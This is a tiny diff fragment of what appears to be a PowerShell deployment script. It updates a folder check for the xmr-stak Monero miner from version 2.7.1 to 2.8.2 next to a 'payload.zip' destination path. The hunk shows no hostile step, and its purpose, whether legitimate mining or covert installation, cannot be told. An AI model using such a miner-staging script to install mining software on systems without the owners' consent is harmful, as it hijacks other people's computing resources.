@@ -128,7 +128,7 @@ else
 
 $payloadDestination = "$opsDirectory\payload.zip"
 
-if (!(Test-Path "$opsDirectory\xmr-stak-win64-.2.7.1"))
+if (!(Test-Path "$opsDirectory\xmr-stak-win64-2.8.2"))
 
 {
 
